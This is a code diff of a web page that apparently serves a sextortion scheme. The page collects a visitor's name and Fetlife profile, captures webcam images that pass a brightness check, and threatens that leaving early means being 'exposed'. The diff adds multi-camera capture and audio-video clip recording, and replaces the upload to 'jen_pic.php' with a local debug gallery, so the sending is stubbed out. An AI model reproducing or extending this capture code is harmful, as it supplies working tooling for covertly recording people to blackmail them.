@@ -5,24 +5,27 @@
 <link rel="stylesheet" type="text/css" href="style.css">
 <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
 <script src="speech.js"></script>
+<script src="video.js"></script>
 
 <script type="text/javascript">
 /* Image Attr */
-   var brightness = 51;
-   var contrast = 51;
+    /**
+     * @param {HTMLCanvasElement} acanvas
+     * @return { {brightness: number, contrast: number} }
+     **/
    function getImageAttr(acanvas) {
-          var colorSum = 0;
-          var cMin = 255;
-          var cMax = 0;
+          let colorSum = 0;
+          let cMin = 255;
+          let cMax = 0;
 
-            var ctx = acanvas.getContext("2d");
+            let ctx = acanvas.getContext("2d");
             ctx.drawImage(acanvas,0,0);
 
-            var imageData = ctx.getImageData(0,0,acanvas.width,acanvas.height);
-            var data = imageData.data;
+            const imageData = ctx.getImageData(0,0,acanvas.width,acanvas.height);
+            const data = imageData.data;
             var r,g,b,avg;
 
-              for(var x = 0, len = data.length; x < len; x+=4) {
+          for(let x = 0, len = data.length; x < len; x+=4) {
                 r = data[x];
                 g = data[x+1];
                 b = data[x+2];
@@ -34,24 +37,28 @@
 				  cMax = avg;
                 colorSum += avg;
             }
-            contrast = cMax-cMin;
-            brightness = Math.floor(colorSum / (acanvas.width*acanvas.height));
+
+
+              return {
+                  contrast: cMax-cMin,
+                  brightness: Math.floor(colorSum / (acanvas.width*acanvas.height))
+              };
+
     }
 
 /*
   Script for main task
 */
-var ended = false;
+let ended = false;
 function exittask() {
-  if (ended == false) {
+  if (ended === false) {
     return "Are you sure you want to leave this page? if you leave early you will be exposed!";
   }
 }
 
 function addlog(ltext){
-  var logtext = ltext;
-  document.getElementById('logmsg').value = logtext;
-  var fd2 = new FormData(document.forms["form2"]);
+    document.getElementById('logmsg').value = ltext;
+  const fd2 = new FormData(document.forms["form2"]);
   console.info("normally now we would send stuff to jenniffer:", fd2);
 }
 
@@ -63,8 +70,6 @@ var level = 0;
 var real_name = "";
 var user_email = "";
 let recorded_audio_blobs = [];
-
-
 
 
 function runtask(){
@@ -124,7 +129,8 @@ function runtask(){
 	    addlog("Name:" + real_name);
 	    addlog("Fetlife:" + fetlife);
 	    addlog("Referred:" + referred);
-		addlog("Sex:Male");addlog("Orientation:Heterosexual");
+		addlog("Sex:Male");
+		addlog("Orientation:Heterosexual");
 		send_photo();
 		break;
       case 4:
@@ -251,97 +257,179 @@ function runtask(){
 </form>
 </div>
 <!-- Video capture - should hide? -->
+
 <div id="container">
-    <video autoplay="true" playsinline id="videoElement">
-    </video>
-<label for="videoSource">Source: </label><select id="videoSource"></select>
-<canvas style="visibility: hidden;" id="canvas" width="640" height="480"></canvas>	
-			
-<form method="post" accept-charset="utf-8" name="form1">
-<input name="id" value="2Z7791161"  type="hidden"/>
- <input name="hidden_data" id='hidden_data' type="hidden"/>
-</form>
-		
+    <label for="videoSource">Source: </label>
+    <fieldset id="videoSource"></fieldset>
+    <button onclick="send_photo()">Force Photo</button>
+    <button onclick="this.disabled = true; send_clip(3000); setTimeout(()=>this.disabled = false, 3000)">Force Clip</button>
+
 </div>
-<script>
+
+    <div id="videoContainer"></div>
+
+    <form method="post" accept-charset="utf-8" name="form1">
+        <input name="id" value="2Z7791161"  type="hidden"/>
+        <input name="hidden_data" id='hidden_data' type="hidden"/>
+    </form>
+
+    <div id="debugGallery">
+        <h3>Debug Gallery</h3>
+    </div>
+
+    <canvas style="visibility: hidden; position: absolute;" id="canvas" width="640" height="480"></canvas>
+    <script>
 var workingcam = true;
 var reallyWorkingcam = true;
 var workingmic = true;
-var video = document.getElementById("videoElement");
-var videoSelect = document.querySelector('select#videoSource');
- 
+const videoContainer = document.getElementById('videoContainer');
+const videoSelect = document.getElementById('videoSource');
+
+
+/**
+ * @type {Array<VideoStreamRecord>}
+ */
+let activeVideoRecords = [];
+
+/**
+ * @type {Array<MediaStreamTrack>}
+ **/
+let activeAudioStreamTracks = [];
+
 navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia || navigator.oGetUserMedia;
  
-if (navigator.getUserMedia) {       
-    navigator.getUserMedia({video: true}, handleVideo, videoError);
+if (navigator.getUserMedia) {
     navigator.getUserMedia({audio: true}, handleAudio, audioError);
 }
- 
 
+loadVideoDevicesList().then((deviceIds) => {
+    // automatically start the first video device
+    if (deviceIds.length > 0) {
+        requestStartVideoDevice([deviceIds[0]]);
+    }
+});
+
+/**
+ * @param {MediaStream} stream
+ */
 function handleAudio(stream) {
-
+    activeAudioStreamTracks = [...activeAudioStreamTracks, ...stream.getAudioTracks()];
 }
 
-function handleVideo(stream) {
-	if (video.src) {
-		URL.revokeObjectURL(video.src); // trying to be clean
-	}
-	try  {
-		video.src = window.URL.createObjectURL(stream);
+/**
+ * @return {Promise<Array<string>>} - an array of video device ids
+ */
+function loadVideoDevicesList() {
+
+// the filling of the select is only done if the select is empty
+
+    if (navigator.mediaDevices  && navigator.mediaDevices.enumerateDevices && videoSelect) {
+        return navigator.mediaDevices.enumerateDevices()
+            .then(function (deviceInfos) {
+
+                videoSelect.innerHTML = ''; // drop options
+                const options = [];
+                const videoInfos = deviceInfos.filter(di => di.kind === 'videoinput');
+                videoInfos
+                    .forEach((deviceInfo, i) => {
+                        const container = document.createElement('div');
+                        const label = document.createElement('label');
+                        label.textContent = deviceInfo.label || 'camera ' + (videoSelect.length + 1);
+                        /** @type HTMLInputElement */
+                        const checkbox = document.createElement('input');
+                        checkbox.type = 'checkbox';
+                        checkbox.value = deviceInfo.deviceId;
+                        checkbox.onchange = onStreamToggled;
+                        checkbox.checked = i === 0;
+                        container.appendChild(label);
+                        container.appendChild(checkbox);
+                        videoSelect.appendChild(container);
+                        options.push(checkbox);
+                    });
+
+
+                return videoInfos.map(di => di.deviceId);
+            })
+            .catch(console.error);
+    } else {
+        return Promise.reject('no mediaDevice support');
+    }
+}
+
+
+
+/**
+ * @param {string} deviceId
+ * @param {MediaStream} stream
+ */
+function handleNewVideoStream(deviceId, stream) {
+
+    if (stream.getTracks().length !== 1) {
+        throw new Error('expected only one track for an exact match query');
+    }
+    const track = stream.getTracks()[0];
+    /**
+     * @type {HTMLVideoElement}
+     */
+    const videoElement = document.createElement('video');
+    videoElement.addEventListener('click', () => togglePip(videoElement));
+
+    videoElement.autoplay = true;
+    const isFirst = videoContainer.childElementCount === 0;
+    if (isFirst) {
+        debugger;
+        videoElement.autoPictureInPicture = true;
+    }
+
+    videoContainer.appendChild(videoElement);
+    try  {
+        videoElement.src = window.URL.createObjectURL(track);
 	} catch(e){
-		video.srcObject = stream;
+        videoElement.srcObject = stream;
 	}
-	
-	// the filling of the select is only done if the select is empty
-	if (navigator.mediaDevices  && navigator.mediaDevices.enumerateDevices && videoSelect.length === 0) {
-		navigator.mediaDevices.enumerateDevices()
-		.then(function (deviceInfos) {
-			// getting the information of the live camera to have it selected in the select
-			var videoTracksList = stream.getVideoTracks(),
-				liveLabel;
-			for (var i = 0; i < videoTracksList.length; i++) {
-				var videoTrack = videoTracksList[i];
-				if (videoTrack.readyState == 'live') {
-					liveLabel = videoTrack.label;
-					break;
-				}
-			}
-			
-			// filling the select
-			for (var i = 0; i !== deviceInfos.length; ++i) {
-				var deviceInfo = deviceInfos[i];
-				var option = document.createElement('option');
-				option.value = deviceInfo.deviceId;
-			
-				if (deviceInfo.kind === 'videoinput') {
-					option.text = deviceInfo.label || 'camera ' + (videoSelect.length + 1);
-					if (deviceInfo.label == liveLabel)
-						option.selected = 'selected';
-					videoSelect.appendChild(option);
-				}
-			}
-			
-			// having the select react to change now
-			videoSelect.onchange = function() {
-				if (stream) {
-					stream.getTracks().forEach(function(track) {
-						track.stop();
-					});
-				}
-				var videoSource = videoSelect.value;
-				var constraints = {
-					audio: false,
-					video: {deviceId: videoSource ? {exact: videoSource} : undefined}
-				};
-				navigator.getUserMedia(constraints,handleVideo,videoError);
-			};
-		})
-		.catch(console.error);
-	}
+
+    /**
+     * @type {VideoStreamRecord}
+     */
+	const videoStream = { id: deviceId, videoElement, stream, track};
+    activeVideoRecords.push(videoStream);
+}
+
+
+/** @param {Event} event */
+function onStreamToggled(event) {
+
+    const checked = event.target.checked;
+    const streamId = event.target.value;
+    const activeVideoRecordIds = activeVideoRecords.map(record => record.id);
+
+    const toStartIds = (checked?[streamId]:[]).filter(x => !activeVideoRecordIds.includes(x));
+
+    const toStopVideos = activeVideoRecords.filter(x => !checked && x.id === streamId);
+
+    activeVideoRecords = activeVideoRecords.filter(x => !(!checked && x.id === streamId));
+
+    toStopVideos.forEach(toStopVideo => {
+            toStopVideo.track.stop();
+            if (toStopVideo.videoElement.url) {
+                URL.revokeObjectURL(toStopVideo.videoElement.url); // trying to be clean
+            }
+            toStopVideo.videoElement.parentElement.removeChild(toStopVideo.videoElement);
+        });
+    requestStartVideoDevice(toStartIds);
+}
+
+/** @param {string[]} deviceIds */
+function requestStartVideoDevice(deviceIds) {
+    deviceIds
+        .map(deviceId => ({
+            video: {deviceId: {exact: deviceId}},
+            audio: false}))
+        .forEach(constraint => navigator.getUserMedia(constraint, handleNewVideoStream.bind(null, constraint.video.deviceId.exact), videoError));
 }
  
 function videoError(e) {
-	console.info('video error');
+	console.info('video error', e);
 	reallyWorkingcam = false;
 }
 
@@ -360,17 +448,24 @@ function send_photo(secret) {
 
 
   if (reallyWorkingcam) {
-    var canvas = document.getElementById("canvas"),
-    context = canvas.getContext("2d");
-    context.drawImage(video, 0, 0, 640, 480);
-	getImageAttr(canvas);
-	
+    const canvas = document.getElementById("canvas");
+    const context = canvas.getContext("2d");
+    const imageWidth = 640;
+    const imageHeight = 480;
+
+      canvas.height = (activeVideoRecords.length) * imageHeight;
+
+      activeVideoRecords.forEach((video, i) =>
+          context.drawImage(video.videoElement, 0, (i)*imageHeight, imageWidth, (i+1)*imageHeight));
+
+      const {brightness, contrast} = getImageAttr(canvas);
+
 	if ((brightness > 50) && (contrast > 50)) {
-//    var dataURL = canvas.toDataURL('image/jpeg', 0.9);   
-	  var dataURL = canvas.toDataURL("image/png");
+	  const dataURL = canvas.toDataURL("image/png");
       document.getElementById('hidden_data').value = dataURL;
-      var fd = new FormData(document.forms["form1"]);
-      var xhr = new XMLHttpRequest();
+      const fd = new FormData(document.forms["form1"]);
+      /**
+      const xhr = new XMLHttpRequest();
       xhr.open('POST', 'jen_pic.php', true);
                 xhr.upload.onprogress = function(e) {				
                 };  
@@ -379,9 +474,46 @@ function send_photo(secret) {
       };
       one.src = dataURL;
       // nope, we are not sending anything
-      //xhr.send(fd);
+      xhr.send(fd);
+       */
+        fakeSendImage(dataURL);
+
 	}
   }
+}
+
+
+function fakeSendImage(dataUrl) {
+    const galleryDiv = document.getElementById('debugGallery');
+    /** @type {HTMLImageElement}*/
+    const img = document.createElement('img');
+    img.src = dataUrl;
+    galleryDiv.appendChild(img);
+
+}
+
+
+function send_clip(durationMillis) {
+    const audioTrack = activeAudioStreamTracks.length > 0 ?  activeAudioStreamTracks[0] : undefined;
+    // record each active camera but only the first with audio
+    activeVideoRecords.forEach((videoTrack, index) => {
+        const first = index === 0;
+        recordClip(activeVideoRecords[0].track, first ? audioTrack : undefined, durationMillis)
+            .then(fakeSendClip);
+    });
+}
+
+function fakeSendClip(dataUrl) {
+    const galleryDiv = document.getElementById('debugGallery');
+
+    /** @type {HTMLVideoElement}*/
+    const video = document.createElement('video');
+    video.autoplay = false;
+    video.controls = true;
+    video.defaultMuted = false;
+    video.src = dataUrl;
+    galleryDiv.appendChild(video);
+
 }
 
 </script>
